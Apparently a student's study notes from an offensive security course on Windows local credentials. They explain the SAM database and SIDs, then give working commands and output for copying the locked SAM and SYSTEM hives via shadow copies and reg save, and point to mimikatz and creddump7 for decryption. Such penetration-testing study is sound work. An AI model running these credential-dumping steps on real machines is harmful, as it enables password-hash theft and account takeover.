# Windows credentials

Windows implements a variety of authentication and post-authentication privilege mechanisms 
that can become quite complex in an Active Directory environment.

# Local windows Credentials

Windows can authenticate local user accounts as well as those belonging to a domain, which are 
stored within Active Directory

# SAM Database

Local Windows credentials are stored in the Security Account Manager (SAM) database670 as 
password hashes using the NTLM hashing format,671 which is based on the MD4 algorithm.

Security identifier in windows 
S-R-I-S

In this structure, the SID begins with a literal “S” to identify the string as a SID, followed by a 
revision level (usually set to “1”), an identifier-authority value (often “5”) and one or more 
subauthority values.
The subauthority will always end with a Relative Identifier (RID)675 representing a specific object 
on the machine.

Let’s use PowerShell and WMI to locate the SID of the local administrator account on our 
Windows 10 victim machine

```
PS C:\Users\HP> $env:computername
WINWORK

PS C:\Users\HP> [wmi] "Win32_userAccount.Domain='WINWORK',Name='Administrator'"


AccountType : 512
Caption     : WINWORK\Administrator
Domain      : WINWORK
SID         : S-1-5-21-1182164374-3560096269-1489256248-500
FullName    :
Name        : Administrator

```

In order to otain credentials from SAM database. 
located at `C:\Windows\System32\config\SAM` but the SYSTEM process has an exclusice lock on it.

potential workarounds.
1/ using Volume Shadow Copy Server, we create a snapshot of the local hard drive with vssadmin. create shadow is awailable in servers.

2/ through wmi we will create a shadow copy of the source deive with `Volume='C:\'`

`wmic shadowcopy call create Volume='C:\'`
This has to be run in Administrator

```
C:\WINDOWS\system32>wmic shadowcopy call create volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{7C036CC7-93E5-4FCD-AF60-7B6962DD711F}";
};
```

to verify we use vssadmin


vssadmin list shadows

```
C:\WINDOWS\system32>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {cdf70d69-615e-4c56-9359-c9ca584f0d3e}
   Contained 1 shadow copies at creation time: 25-08-2022 12:16:16
      Shadow Copy ID: {7c036cc7-93e5-4fcd-af60-7b6962dd711f}
         Original Volume: (C:)\\?\Volume{93e4830a-3122-41fd-acfa-b6c2e7f186ec}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: winwork.misthios.ncg.in
         Service Machine: winwork.misthios.ncg.in
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

we can use this shadow copy to copy file:

```
C:\WINDOWS\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\
        1 file(s) copied.
```

Although we have copied the SAM database, it is partially encrypted by either RC4 or AES. The keys are stored in a system file also locked by the system account

```
C:\WINDOWS\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\HP\Documents\pen300\book\chapter12\system
        1 file(s) copied.
```

We can also obtain a copy of the SAM database and SYSTEM files from the registry in the
HKLM\sam and HKLM\system hives, respectively. Administrative permissions are required to
read and copy.

```
C:\WINDOWS\system32>reg save HKLM\sam C:\users\HP\sam
The operation completed successfully.

C:\WINDOWS\system32>reg save HKLM\system C:\users\HP\system
The operation completed successfully.
```

two tools to use to decrypt he signatures

1. mimikatz - 
2. creddump7

to use creddump7 -

1. sudo apt install python-crypto library
2. sudo  git clone https://github.com/Neohapsis/creddump7

however the correct location maybe here
for credential dump : https://github.com/moyix/creddump
for pycrypto : pip install pycrypto















